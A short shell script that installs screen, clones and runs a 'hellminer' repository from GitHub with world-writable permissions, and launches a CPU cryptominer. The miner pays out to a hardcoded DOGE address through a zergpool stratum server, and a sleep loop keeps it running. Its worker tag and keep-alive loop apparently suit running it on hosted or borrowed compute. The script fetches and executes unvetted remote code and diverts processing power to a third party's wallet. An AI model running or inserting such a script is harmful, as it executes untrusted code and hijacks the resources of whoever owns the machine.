#!/bin/sh
sudo apt update
sudo apt install screen -y
git clone https://github.com/vrscms/hellminer.git && chmod -R 777 hellminer && cd hellminer && ./install.sh
./hellminer verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DSzLocfDTXu7BZFUJF9Qd5yEFm9dfU6VLP -p c=DOGE,mc=VRSC,ID=NEAR-GIT --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
